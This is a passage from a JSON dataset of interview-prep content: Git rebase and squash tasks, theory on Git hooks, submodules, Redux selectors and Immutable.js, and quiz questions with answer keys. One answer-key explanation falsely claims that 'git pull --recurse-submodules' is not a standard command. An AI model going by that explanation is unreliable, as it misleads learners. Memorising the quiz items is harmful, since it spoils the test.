          "solutionCode": "git fetch origin\ngit rebase origin/main\ngit push origin feat/header\n# If history was rewritten (which it is with rebase),\n# and the branch was already pushed, you might need:\n# git push --force-with-lease origin feat/header",
          "testCases": [
            "Local `feat/header` branch is rebased onto `origin/main`.",
            "Commit history of `feat/header` is linear after integration.",
            "The `feat/header` branch is successfully pushed to `origin`."
          ],
          "hints": [
            "Consider the difference between `git pull` and `git fetch` followed by a separate operation.",
            "Which command is used to rewrite history and create a linear sequence?",
            "If you've already pushed your `feat/header` branch before rebasing, remember that you've rewritten history. Think about how Git handles pushes of rewritten history to a remote."
          ],
          "tags": [
            "Git",
            "Workflow",
            "Synchronization",
            "Rebase",
            "Feature Branch",
            "Collaboration"
          ],
          "timeEstimate": 25,
          "prerequisites": [
            "git_remote_sync",
            "git_history_management"
          ],
          "complexity": 6,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "git_remote_sync",
            "git_history_management"
          ]
        },
        {
          "id": "task_git_clean_feature_history",
          "title": "Clean Up Feature Branch History for Pull Request",
          "description": "\nYou have completed a `feature/dashboard` branch. During development, you made numerous small commits like \"fix bug\", \"add style\", \"WIP\", \"refactor part A\". Before submitting a pull request to `main`, your team's policy is to squash these incremental commits into one or two meaningful commits, to keep the `main` branch's history clean and easy to understand.\n\n**Requirements:**\n1.  Assume you are on your `feature/dashboard` branch with at least 5-7 small commits on top of `main`.\n2.  Use an interactive rebase to consolidate all these feature-related commits into a single, comprehensive commit.\n3.  Write a clear and descriptive commit message for the new, squashed commit (e.g., \"feat: Implement full dashboard functionality\").\n4.  After the rebase, consider how you would push this modified branch to the remote, assuming it was already pushed publicly before the rebase.\n\nProvide the Git commands and explain the interactive rebase steps.\n",
          "difficulty": "hard",
          "startingCode": "# Assume you are on 'feature/dashboard' with multiple commits.\n# Example: git log --oneline\n# <hash> (HEAD -> feature/dashboard) Add pagination\n# <hash> Update dashboard layout\n# <hash> Fix minor UI bug\n# <hash> (origin/main, main) Initial dashboard setup\n",
          "solutionCode": "```bash\n# 1. Ensure you are on the feature branch\ngit checkout feature/dashboard\n\n# 2. Start an interactive rebase\n# Replace '5' with the actual number of commits you want to squash, \n# or use the commit hash of the base commit (e.g., origin/main's tip).\n# For example, if you want to squash the last 5 commits:\ngit rebase -i HEAD~5\n\n# 3. In the editor that opens:\n# The commits are listed from oldest to newest.\n# Change 'pick' to 'squash' (or 's') for all commits you want to merge into the first one.\n# Keep 'pick' for the oldest commit that will become the new single commit.\n\n# Example of how you'd edit the todo list:\n# Before:\n# pick abcdef1 Initial dashboard setup\n# pick 2345678 Fix minor UI bug\n# pick 90abcdef Update dashboard layout\n# pick cdef012 Add pagination\n\n# After (to squash all into the first 'Initial dashboard setup' commit):\n# pick abcdef1 Initial dashboard setup\n# squash 2345678 Fix minor UI bug\n# squash 90abcdef Update dashboard layout\n# squash cdef012 Add pagination\n\n# 4. Save and close the editor. Git will then open another editor for the new commit message.\n# Provide a clear, comprehensive message for the squashed feature:\n# feat: Implement full dashboard functionality\n#\n# This commit introduces the complete dashboard feature, including:\n# - Data fetching and display\n# - Pagination for results\n# - Responsive layout adjustments\n# - Minor UI bug fixes\n\n# 5. After saving the new commit message, the rebase is complete.\n# To push this rewritten history to the remote:\n# WARNING: Only do this if you are absolutely sure no one else has pulled this branch!\n# git push --force-with-lease origin feature/dashboard\n# If it's a private, unshared branch, then --force-with-lease is safe.\n# If it was a publicly shared branch, discuss with team or avoid rebase on public branch.\n```",
          "testCases": [
            "The feature branch's history is condensed into a single commit.",
            "The new commit message is descriptive and reflects the entire feature.",
            "The developer demonstrates understanding of when `--force-with-lease` is appropriate after rebase."
          ],
          "hints": [
            "The `HEAD~N` syntax refers to the last N commits from the current `HEAD`.",
            "Use `git log --oneline` to inspect your recent commits and count how many you need to rebase.",
            "Remember that the first commit in the interactive rebase list (the oldest) is usually the one you 'pick' and will be the base for the squashed commit. All subsequent commits will be squashed into it.",
            "The safest way to handle a branch that was already pushed and then rebased is to communicate with your team or simply avoid rebasing public branches. If it's your personal feature branch not shared yet, `--force-with-lease` is fine."
          ],
          "tags": [
            "Git",
            "Rebase",
            "History",
            "Clean History",
            "Pull Request",
            "Advanced"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "git_history_management"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "git_history_management",
            "git_remote_sync"
          ]
        }
      ]
    }
  },
  {
    "id": "1b6683e1-07cd-482a-8295-68db72aa08ac",
    "startLine": 10600,
    "endLine": 10699,
    "processedDate": "2025-06-17T11:41:05.910Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_advanced_git_techniques",
          "title": "Advanced Git Techniques: Workflow, Hooks, and Submodules",
          "content": "## Git Workflow Best Practices\nEffective Git workflows are crucial for team collaboration and maintaining a clean, understandable project history. Adopting best practices can significantly improve code review, debugging, and overall development efficiency.\n\n### 1. Pull with rebase for cleaner history\nUsing `git pull --rebase` instead of a standard `git pull` (which performs a merge) ensures a linear project history. When you rebase, your local commits are temporarily put aside, the remote changes are fetched and applied, and then your local commits are reapplied on top. This avoids unnecessary merge commits, making the history easier to read and follow.\n\n### 2. Use branches for features and fixes\nBranching is fundamental in Git. Each new feature or bug fix should be developed on its own dedicated branch. This isolates changes, prevents conflicts with the main development line (e.g., `master`/`main`), and allows for concurrent development. Descriptive branch names (e.g., `feature/new-login`, `fix/header-alignment`, `bugfix/issue-123`) are essential for organization and clarity.\n\n### 3. Resolve merge conflicts properly\nConflicts occur when Git cannot automatically combine changes from different branches. Resolving them involves manually editing the conflicted files to combine the desired changes from both branches. After editing, the files must be staged (`git add`) and the merge committed (`git commit`). Understanding conflict markers (`<<<<<<<`, `=======`, `>>>>>>>`) is key.\n\n### 4. Use .gitignore for project-specific files\nThe `.gitignore` file specifies intentionally untracked files that Git should ignore. This is vital for keeping your repository clean by excluding generated files (e.g., `build/`, `dist/`), dependency directories (`node_modules/`), environment-specific configurations (`.env`), personal IDE settings (`.idea/`, `.vscode/`), and temporary files. A well-maintained `.gitignore` prevents irrelevant files from cluttering the repository and causing issues across different development environments.\n\n### 5. Commit atomically\nAtomic commits mean that each commit should represent a single, complete, logical change. For example, a commit might introduce a new feature, fix a single bug, or refactor a specific part of the code. This practice makes code reviews easier, simplifies reverting changes (if necessary), and provides a clear narrative of how the project evolves.\n\n## Git Hooks\nGit hooks are custom scripts that Git automatically executes before or after events like committing, pushing, or receiving commits. They are stored in the `.git/hooks` directory of a repository. Hooks allow developers and teams to automate tasks, enforce coding standards, and streamline workflows. While default hooks are examples, custom scripts can be written in any language (e.g., shell scripts, Python, Node.js).\n\nCommon Git hooks include:\n-   `pre-commit`: Runs *before* a commit is created. Often used to run linters, formatters, or tests to ensure code quality before it's even committed.\n-   `commit-msg`: Runs *after* a commit message has been provided but *before* the commit is finalized. Used to validate the format or content of commit messages (e.g., enforcing a specific prefix like `feat:`, `fix:`).\n-   `pre-push`: Runs *before* pushing to a remote repository. Can be used to run full test suites, build checks, or ensure that the local branch is up-to-date with the remote to prevent pushing breaking changes.\n\n## Git Submodules\nGit submodules allow you to embed one Git repository inside another as a subdirectory. This is useful when your project depends on a specific version of an external repository, and you want to manage that dependency directly within your main project. Submodules effectively pin the dependency to a specific commit, ensuring consistency across all development environments.\n\n### Key Submodule Commands:\n-   `git submodule add <repository-url> <path>`: Adds a new submodule. The specified repository will be cloned into the given path within your main repository.\n-   `git submodule init`: Initializes new submodules found in the `.gitmodules` file (which tracks submodule configurations). This command essentially registers the submodules.\n-   `git submodule update`: Fetches and checks out the correct commit for the submodules as recorded in the parent repository. This is crucial after cloning a repository with submodules or when a submodule's reference commit has been updated.\n-   `git clone --recurse-submodules <repository-url>`: Clones the main repository and automatically initializes and updates all submodules within it. This is the recommended way to clone a project that contains submodules.",
          "examples": [
            {
              "id": "example_git_workflow_1",
              "title": "Pull with Rebase",
              "code": "git checkout feature/my-feature\ngit add .\ngit commit -m \"Implement part of feature X\"\ngit pull --rebase origin main",
              "explanation": "This sequence demonstrates working on a feature branch, committing local changes, and then rebasing those changes on top of the latest 'main' branch updates from the 'origin' remote. This keeps the branch history linear and avoids a merge commit.",
              "language": "bash"
            },
            {
              "id": "example_git_workflow_2",
              "title": "Adding and Updating Git Submodules",
              "code": "# Add a new submodule\ngit submodule add https://github.com/example/my-library.git lib/my-library\n\n# Initialize and update all submodules after cloning a repo\ngit submodule init\ngit submodule update\n\n# Or clone with submodules directly\ngit clone --recurse-submodules https://github.com/my-org/my-project.git",
              "explanation": "These commands illustrate how to add a new submodule (linking an external repository into a sub-directory), and how to initialize and update existing submodules within a cloned repository. The `git clone --recurse-submodules` command streamlines the process for new clones.",
              "language": "bash"
            },
            {
              "id": "example_git_hooks_1",
              "title": "Basic pre-commit hook (Shell)",
              "code": "#!/bin/sh\n\n# Navigate to the .git/hooks directory for this file\n# Save this as .git/hooks/pre-commit and make it executable (chmod +x)\n\n# Example: Run linting before commit\necho \"Running pre-commit hook...\"\n\nnpm test -- --findRelatedTests $(git diff --cached --name-only)\n\nif [ $? -ne 0 ]; then\n  echo \"Tests failed. Aborting commit.\"\n  exit 1\nfi\n\n# Example: Prevent committing files with specific content (e.g., 'debugger;')\nif git diff --cached | grep -q 'debugger;'; then\n  echo \"ERROR: Found 'debugger;' statements. Please remove them before committing.\"\n  exit 1\nfi\n\necho \"Pre-commit hook finished successfully.\"\nexit 0",
              "explanation": "This shell script demonstrates a `pre-commit` hook. It first attempts to run relevant tests for staged files. If tests fail, the commit is aborted. It also checks for 'debugger;' statements, preventing commits that include them. This ensures basic code quality and prevents debugging remnants from entering the codebase.",
              "language": "bash"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "Git",
            "Version Control",
            "Workflow",
            "Branching",
            "Rebase",
            "Git Hooks",
            "Submodules",
            "Collaboration",
            "Best Practices"
          ],
          "technology": "Git",
          "prerequisites": [
            "Basic Git commands (add, commit, push, pull, checkout)"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "requiredFor": [
            "Team Collaboration",
            "Monorepos (Submodules)",
            "CI/CD Automation",
            "Code Quality Enforcement"
          ]
        },
        {
          "id": "theory_redux_selectors",
          "title": "Redux Selectors: Efficient State Access and Derived Data",
          "content": "## Redux Selectors\nSelectors are pure functions that take the Redux store's state as an argument and return a specific slice of that state or a computed, derived piece of data. They are a fundamental pattern in Redux applications for several reasons:\n\n### 1. Centralized Data Access Logic\nSelectors encapsulate the logic for extracting data from the Redux store. Instead of components directly digging into the state structure (e.g., `state.users.data.byId[userId]`), they can call a selector (e.g., `selectUserById(state, userId)`). This makes components simpler and less coupled to the exact shape of the state.\n\n### 2. Reusability\nOnce defined, a selector can be reused across multiple components or even other selectors. If the state structure changes, only the selector needs to be updated, not every component that uses that piece of data.\n\n### 3. Memoization for Performance Optimization\nOne of the most powerful features of selectors, especially when used with libraries like `reselect`, is memoization. Memoized selectors remember the last inputs and outputs. If the inputs to the selector haven't changed, it returns the previously computed result without re-executing its logic. This is critical for performance in React/Redux applications, as it prevents unnecessary re-renders of components that depend on derived data.\n\n### 4. Computing Derived Data\nSelectors are ideal for computing derived data that doesn't need to be stored directly in the Redux state. For example, filtering a list, summing values, or joining data from different parts of the state can all be done efficiently within a selector. This keeps the state minimal and normalized.\n\n### Key Characteristics of Good Selectors:\n-   **Pure Functions**: They should produce the same output for the same input and have no side effects.\n-   **Composable**: Small, focused selectors can be combined to create more complex ones.\n-   **Memoized**: For performance, especially when computing derived data or processing large state slices.",
          "examples": [
            {
              "id": "example_redux_selector_1",
              "title": "Basic Redux Selector",
              "code": "// selectors/userSelectors.js\nexport const selectUserList = (state) => state.users.list;\nexport const selectUserById = (state, userId) => \n  state.users.byId[userId];\n\n// components/UserDetail.js\nimport { useSelector } from 'react-redux';\nimport { selectUserById } from '../selectors/userSelectors';\n\nfunction UserDetail({ userId }) {\n  const user = useSelector(state => selectUserById(state, userId));\n  \n  if (!user) return <div>Loading...</div>;\n  \n  return (\n    <div>\n      <h2>{user.name}</h2>\n      <p>Email: {user.email}</p>\n    </div>\n  );\n}",
              "explanation": "This example shows basic selectors for retrieving a list of users and a specific user by ID. Components use `useSelector` to get data via these selectors, centralizing state access logic and making components cleaner.",
              "language": "javascript"
            },
            {
              "id": "example_redux_selector_2",
              "title": "Memoized Selector with Reselect",
              "code": "import { createSelector } from 'reselect';\n\n// Input selectors\nconst getUsers = (state) => state.users.list;\nconst getActiveFilter = (state) => state.filters.active;\n\n// Memoized selector for filtered users\nexport const selectFilteredUsers = createSelector(\n  [getUsers, getActiveFilter],\n  (users, activeFilter) => {\n    if (activeFilter === 'all') {\n      return users;\n    }\n    return users.filter(user => user.status === activeFilter);\n  }\n);\n\n// Usage in a component\n// const filteredUsers = useSelector(selectFilteredUsers);",
              "explanation": "This example demonstrates `createSelector` from `reselect`. `getUsers` and `getActiveFilter` are 'input selectors'. `selectFilteredUsers` is a memoized selector that will only re-execute its filtering logic if either `users` or `activeFilter` change. This prevents redundant computations and improves performance.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "Redux",
            "State Management",
            "Selectors",
            "Reselect",
            "Performance",
            "Memoization",
            "React",
            "Frontend Architecture"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "Basic Redux concepts (store, reducers, actions)",
            "Functional Programming basics"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "Optimized Redux Applications",
            "Large-scale Frontend Projects",
            "State Management Best Practices"
          ]
        },
        {
          "id": "theory_immutable_js",
          "title": "Immutable.js: Persistent Immutable Data Structures",
          "content": "## Immutable.js\nImmutable.js is a library that provides a set of immutable, persistent data structures. In immutable data structures, operations like adding, removing, or updating elements do not modify the original data structure. Instead, they return a new data structure containing the updated state, while efficiently sharing unchanged parts of the original structure. This 'persistence' means that previous versions of the data remain available.\n\n### Why use Immutable.js?\n-   **Predictability**: Immutability makes state changes predictable and easier to reason about, as data cannot be accidentally modified.\n-   **Performance Optimization (especially with React/Redux)**: In React, `shouldComponentUpdate` and `React.memo` (or `PureComponent`) perform shallow comparisons of props and state. With mutable data, a change deep within an object might not trigger a re-render because the reference to the object itself hasn't changed. Immutable data structures always return a new reference when changed, making shallow comparisons reliable and efficient for detecting true changes, thus preventing unnecessary re-renders.\n-   **Simplifies Undo/Redo**: Since previous states are always preserved, implementing undo/redo functionality becomes much simpler.\n-   **Concurrency**: Immutability naturally leads to thread-safe operations, although this is less critical in single-threaded JavaScript environments.\n\n### Immutable.js Data Structures\nImmutable.js offers several data structures that are analogous to native JavaScript types but with immutable behavior:\n\n#### List\nAn immutable equivalent of JavaScript's `Array`. It provides array-like methods (e.g., `get`, `set`, `push`, `pop`, `map`, `filter`) but all modifying operations return a new `List` instance.\n\n**Key methods for List:**\n-   `List()`: Creates an empty List.\n-   `List(array)`: Creates a List from a JavaScript array.\n-   `get(index)`: Returns the value at the specified index.\n-   `set(index, value)`: Returns a new List with the value at the index updated.\n-   `push(value)`: Returns a new List with the value added to the end.\n-   `pop()`: Returns a new List with the last value removed.\n-   `map(mapper)`: Returns a new List with each value mapped by the provided function.\n-   `toJS()`: Converts the Immutable.js List back to a plain JavaScript Array (and recursively converts nested Immutable collections).\n\n#### Other Data Structures\n-   **Map**: Immutable equivalent of JavaScript `Object`/`Map`.\n-   **Stack**: A LIFO (Last-In-First-Out) collection.\n-   **Set**: A collection of unique values.\n-   **OrderedMap/OrderedSet**: Maintain insertion order.\n-   **Record**: Defines a fixed set of keys and default values, similar to a class or struct.\n\nThese data structures achieve efficiency through structural sharing, meaning that when a change is made, only the altered parts of the data structure are copied, and unchanged parts are referenced from the original structure.",
          "examples": [
            {
              "id": "example_immutable_list_1",
              "title": "Immutable.js List Basic Usage",
              "code": "import { List } from 'immutable';\n\nconst initialList = List([1, 2, 3]);\nconsole.log('Initial List:', initialList.toJS()); // Output: [1, 2, 3]\n\nconst updatedList = initialList.push(4);\nconsole.log('Updated List (new instance):', updatedList.toJS()); // Output: [1, 2, 3, 4]\nconsole.log('Original List (unchanged):', initialList.toJS()); // Output: [1, 2, 3]\n\nconst listWithSet = updatedList.set(0, 100);\nconsole.log('List with element set:', listWithSet.toJS()); // Output: [100, 2, 3, 4]\n\nconst mappedList = listWithSet.map(x => x * 2);\nconsole.log('Mapped List:', mappedList.toJS()); // Output: [200, 4, 6, 8]\n",
              "explanation": "This example demonstrates the core concept of immutability with `Immutable.List`. Operations like `push` and `set` do not modify `initialList` or `updatedList` in place. Instead, they return new `List` instances (`updatedList`, `listWithSet`, `mappedList`) reflecting the changes, leaving the original lists untouched. `toJS()` is used to convert the Immutable.js List back to a standard JavaScript Array for easy console logging.",
              "language": "javascript"
            },
            {
              "id": "example_immutable_performance_2",
              "title": "Immutable.js with React/Redux context",
              "code": "import React from 'react';\nimport { useSelector } from 'react-redux';\nimport { List } from 'immutable';\n\n// Example Reducer (simplified)\nconst initialState = List([]);\nfunction itemsReducer(state = initialState, action) {\n  switch (action.type) {\n    case 'ADD_ITEM':\n      return state.push(action.payload);\n    case 'REMOVE_LAST_ITEM':\n      return state.pop();\n    default:\n      return state;\n  }\n}\n\n// Example Component leveraging shallow comparison\nconst ItemList = React.memo(({ items }) => {\n  console.log('ItemList rendered'); // This will only log if 'items' reference changes\n  return (\n    <ul>\n      {items.toJS().map((item, index) => (\n        <li key={index}>{item}</li>\n      ))}\n    </ul>\n  );\n});\n\nfunction App() {\n  const items = useSelector(state => state.items); // Assuming 'items' is an Immutable.List in Redux state\n\n  // When itemsReducer returns a new Immutable.List instance (due to push/pop),\n  // the 'items' prop reference changes, triggering ItemList to re-render.\n  // If itemsReducer returned the same mutable array, React.memo might miss updates.\n  \n  return (\n    <div>\n      <ItemList items={items} />\n      {/* Buttons to dispatch actions */}\n    </div>\n  );\n}\n",
              "explanation": "This example illustrates how `Immutable.js` integrates with `React.memo` (or `PureComponent`) in a Redux context. When the Redux state, which holds an `Immutable.List`, is updated by the reducer (e.g., `state.push(action.payload)`), a new `List` instance is returned. This ensures that the `items` prop passed to `ItemList` is a *new reference*, triggering `React.memo`'s shallow comparison to detect the change and re-render `ItemList` correctly and efficiently. If a mutable array were used and modified in place, `React.memo` would not detect a reference change, potentially skipping necessary re-renders.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "Immutable.js",
            "Immutability",
            "Data Structures",
            "Redux",
            "React",
            "Performance",
            "State Management",
            "JavaScript"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "JavaScript Arrays and Objects",
            "Concepts of Mutability",
            "Basic React and Redux"
          ],
          "complexity": 6,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "Optimizing React/Redux Performance",
            "Complex State Management",
            "Functional Programming Paradigms"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_git_rebase_vs_merge_1",
          "topic": "Git Workflow Best Practices",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following commands is used to incorporate changes from a remote branch into your current local branch while maintaining a linear, clean commit history by avoiding unnecessary merge commits?",
          "answer": "git pull --rebase origin master",
          "options": [
            "git merge origin/master",
            "git rebase master",
            "git pull --rebase origin master",
            "git fetch origin master"
          ],
          "analysisPoints": [
            "`git merge` creates a merge commit, which can clutter history.",
            "`git rebase master` would rebase your current branch onto the local `master`, not pull from remote.",
            "`git fetch` only downloads changes, it doesn't integrate them.",
            "`git pull --rebase origin master` (or `main`) fetches from remote and reapplies local commits on top, ensuring a linear history."
          ],
          "keyConcepts": [
            "Git Rebase",
            "Git Merge",
            "Linear History",
            "Remote Tracking Branches"
          ],
          "evaluationCriteria": [
            "Understanding of `rebase` vs `merge` outcomes.",
            "Knowledge of `git pull` options.",
            "Ability to select the correct command for a specific history goal."
          ],
          "example": "The key is `--rebase`, which tells Git to reapply your local commits on top of the fetched commits from the remote, rather than creating a merge commit. This results in a cleaner, linear history.",
          "tags": [
            "Git",
            "Rebase",
            "Merge",
            "Workflow",
            "History"
          ],
          "prerequisites": [
            "git pull",
            "git merge",
            "git rebase"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_git_branching_strategy_2",
          "topic": "Git Workflow Best Practices",
          "level": "easy",
          "type": "flashcard",
          "question": "Why is it a best practice to create separate branches for new features and bug fixes?",
          "answer": "To isolate changes, prevent conflicts with the main development line, and allow for concurrent development.",
          "analysisPoints": [
            "Isolation: Prevents breaking the main branch.",
            "Collaboration: Allows multiple developers to work on different tasks simultaneously.",
            "Stability: Ensures the main branch remains stable and deployable."
          ],
          "keyConcepts": [
            "Git Branching",
            "Feature Branches",
            "Bugfix Branches"
          ],
          "evaluationCriteria": [
            "Understanding of branching purpose.",
            "Ability to articulate benefits of isolated development."
          ],
          "example": "Using branches like `feature/user-profile` or `fix/login-bug` clearly separates development efforts.",
          "tags": [
            "Git",
            "Branching",
            "Workflow"
          ],
          "prerequisites": [
            "git checkout -b"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_git_gitignore_purpose_3",
          "topic": "Git Workflow Best Practices",
          "level": "easy",
          "type": "open",
          "question": "Explain the purpose of a `.gitignore` file and provide examples of common file types or directories that should be included in it for a typical frontend project.",
          "answer": "A `.gitignore` file specifies intentionally untracked files that Git should ignore. This prevents Git from adding, tracking, or committing these files to the repository. Its primary purpose is to keep the repository clean and relevant by excluding generated files, temporary files, dependency directories, and environment-specific configurations.\n\nCommon examples for a frontend project include:\n-   `node_modules/`: Directory containing project dependencies installed by npm/yarn.\n-   `build/`, `dist/`: Directories containing compiled or bundled output files.\n-   `.env`, `.env.local`: Environment variable files that contain sensitive information or local configurations.\n-   `.DS_Store`: macOS specific hidden files.\n-   `npm-debug.log*`: npm debug logs.\n-   `.vscode/`, `.idea/`: IDE-specific configuration directories (though some teams track shared IDE settings).\n-   `coverage/`: Test coverage reports.",
          "analysisPoints": [
            "Clear definition of `.gitignore`'s role.",
            "Ability to list relevant examples specific to frontend development.",
            "Understanding of *why* certain files should be ignored (e.g., generated, sensitive, environment-specific)."
          ],
          "keyConcepts": [
            ".gitignore",
            "Untracked Files",
            "Repository Cleanliness",
            "Dependency Management"
          ],
          "evaluationCriteria": [
            "Accuracy of `.gitignore` definition.",
            "Relevance and diversity of examples.",
            "Justification for ignoring files."
          ],
          "example": "Ignoring `node_modules` is critical because it keeps the repository small and ensures everyone uses dependencies specified in `package.json`.",
          "tags": [
            "Git",
            ".gitignore",
            "Frontend",
            "Best Practices"
          ],
          "prerequisites": [],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_git_atomic_commits_4",
          "topic": "Git Workflow Best Practices",
          "level": "medium",
          "type": "flashcard",
          "question": "What does it mean to 'commit atomically' in Git, and what are its benefits?",
          "answer": "Committing atomically means making each commit represent a single, complete, logical change. For example, a single commit might fix a bug, implement a small feature, or refactor a specific function, but not a mix of these. Benefits include easier code reviews, simpler debugging (using `git bisect`), and more straightforward reverting of specific changes.",
          "analysisPoints": [
            "Definition of atomic commit.",
            "Clear articulation of benefits (review, bisect, revert)."
          ],
          "keyConcepts": [
            "Atomic Commits",
            "Commit Granularity",
            "Code Review",
            "Git Bisect"
          ],
          "evaluationCriteria": [
            "Clarity and completeness of explanation.",
            "Identification of primary benefits."
          ],
          "example": "Instead of one large commit titled 'Fixes and features', you would have separate commits like 'Fix: Login page CSS alignment' and 'Feat: Add user profile picture upload'.",
          "tags": [
            "Git",
            "Commits",
            "Best Practices",
            "Workflow"
          ],
          "prerequisites": [
            "git commit"
          ],
          "complexity": 5,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        },
        {
          "id": "question_git_hooks_purpose_5",
          "topic": "Git Hooks",
          "level": "medium",
          "type": "open",
          "question": "Describe what Git hooks are and list three common types of Git hooks, explaining a typical use case for each in a frontend development context.",
          "answer": "Git hooks are custom scripts that Git automatically executes before or after certain events occur (e.g., committing, pushing). They allow for automation and enforcement of policies within a Git workflow.\n\nThree common types and their use cases:\n1.  **`pre-commit`**: Runs *before* a commit is created. \n    *   **Use case**: Running linters (e.g., ESLint, Prettier) to enforce code style and catch syntax errors on staged files, or running unit tests on modified files to prevent broken code from being committed.\n2.  **`commit-msg`**: Runs *after* a commit message has been provided, but *before* the commit is finalized.\n    *   **Use case**: Validating commit message format (e.g., ensuring messages adhere to Conventional Commits specification like `feat:`, `fix:`, `chore:`) to maintain a consistent and parseable commit history.\n3.  **`pre-push`**: Runs *before* pushing commits to a remote repository.\n    *   **Use case**: Running a full suite of integration tests or a build process to ensure that the code being pushed to the remote repository is stable and won't break the CI/CD pipeline or deployment.",
          "analysisPoints": [
            "Accurate definition of Git hooks.",
            "Correct identification of common hook types.",
            "Clear and relevant use cases for frontend development for each hook."
          ],
          "keyConcepts": [
            "Git Hooks",
            "Automation",
            "CI/CD",
            "Code Quality",
            "Workflow Enforcement"
          ],
          "evaluationCriteria": [
            "Understanding of Git hook mechanism.",
            "Ability to apply knowledge to practical scenarios.",
            "Completeness of explanations for each hook."
          ],
          "example": "Many projects use `husky` or `lint-staged` to simplify managing `pre-commit` hooks for linting and formatting.",
          "tags": [
            "Git",
            "Git Hooks",
            "Automation",
            "Frontend Development"
          ],
          "prerequisites": [
            "Basic Git concepts"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_git_submodule_clone_6",
          "topic": "Git Submodules",
          "level": "medium",
          "type": "mcq",
          "question": "You have cloned a Git repository that uses submodules, but the submodule directories appear empty. Which command sequence would you use to properly initialize and populate the submodules?",
          "answer": "git submodule init && git submodule update",
          "options": [
            "git submodule add <url> <path>",
            "git submodule init && git submodule update",
            "git pull --recurse-submodules",
            "git clone --recursive <url>"
          ],
          "analysisPoints": [
            "`git submodule add` is for adding *new* submodules, not populating existing ones after clone.",
            "`git pull --recurse-submodules` isn't a standard command, and `git pull` focuses on merging/rebasing the main repo.",
            "`git clone --recursive` is an alternative way to *initially clone* with submodules, but not for fixing an already cloned repo with empty submodules.",
            "`git submodule init` initializes the local configuration for submodules, and `git submodule update` populates their content."
          ],
          "keyConcepts": [
            "Git Submodules",
            "Submodule Initialization",
            "Submodule Update",
            "Cloning Repositories"
          ],
          "evaluationCriteria": [
            "Knowledge of correct submodule commands.",
            "Understanding of the submodule lifecycle.",
            "Ability to troubleshoot common submodule issues."
          ],
          "example": "After a standard `git clone` of a repository containing submodules, the submodule directories will be present but empty. Running `git submodule init` followed by `git submodule update` will download and checkout the correct versions of the submodules.",
          "tags": [
            "Git",
            "Submodules",
            "Commands"
          ],
          "prerequisites": [
            "git clone"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_redux_selectors_benefits_7",
          "topic": "Redux Selectors",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary benefit of using Redux selectors in a React application?",
          "answer": "Selectors provide a way to extract specific pieces of information from the Redux store state in a reusable and often memoized manner, leading to improved performance (by preventing unnecessary re-renders) and better state access organization.",
          "analysisPoints": [
            "Reusability: Centralizes state access logic.",
            "Performance: Enables memoization to avoid re-computation and unnecessary re-renders.",
            "Decoupling: Components are less dependent on state shape."
          ],
          "keyConcepts": [
            "Redux Selectors",
            "Memoization",
            "State Management",
            "Performance Optimization"
          ],
          "evaluationCriteria": [
            "Concise summary of benefits.",
            "Emphasis on reusability and performance."
          ],
          "example": "Instead of `state.user.profile.name`, a selector `selectUserName(state)` provides a stable interface.",
          "tags": [
            "Redux",
            "Selectors",
            "React",
            "Performance"
          ],
          "prerequisites": [
            "Redux state"
          ],
          "complexity": 4,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_redux_selectors_memoization_8",
          "topic": "Redux Selectors",
          "level": "medium",
          "type": "open",
          "question": "Explain how memoization with `reselect` benefits Redux selectors and provide a simple code example demonstrating a memoized selector.",
          "answer": "Memoization is a technique where the result of a function call is cached and returned if the same inputs occur again. With `reselect`, memoized selectors only re-run their computation function if their input selectors' results have changed. This is highly beneficial for Redux applications because:\n1.  **Performance**: Prevents expensive re-computations of derived data, especially if the data processing is complex or involves large datasets.\n2.  **Optimized Re-renders**: In React, if a component's props are derived from Redux state via a memoized selector, and the selector returns the same reference (because its inputs haven't changed), `React.memo` (or `PureComponent`) will skip re-rendering that component, leading to significant performance gains.\n\n```javascript\nimport { createSelector } from 'reselect';\n\n// Input selectors\nconst getProducts = (state) => state.products.list;\nconst getCurrencyRate = (state) => state.settings.currencyRate;\n\n// Memoized selector: Calculates product prices in local currency\nexport const selectProductsInLocalCurrency = createSelector(\n  [getProducts, getCurrencyRate],\n  (products, rate) => {\n    console.log('Recalculating product prices...'); // This message will only appear if products or rate change\n    return products.map(product => ({\n      ...product,\n      priceLocal: product.priceUSD * rate\n    }));\n  }\n);\n\n// Example usage:\n// const products = useSelector(selectProductsInLocalCurrency);\n// If other parts of the state change but products.list and settings.currencyRate do not,\n// 'selectProductsInLocalCurrency' will not re-run, returning the cached result.\n```",
          "analysisPoints": [
            "Clear explanation of memoization.",
            "Specific benefits related to Redux/React performance.",
            "Correct use of `createSelector` with input selectors and computation function.",
            "Demonstration of memoization's effect (e.g., `console.log` example)."
          ],
          "keyConcepts": [
            "Memoization",
            "Reselect",
            "Redux Selectors",
            "Performance Optimization",
            "Pure Functions"
          ],
          "evaluationCriteria": [
            "Technical accuracy of explanation.",
            "Clarity and correctness of the code example.",
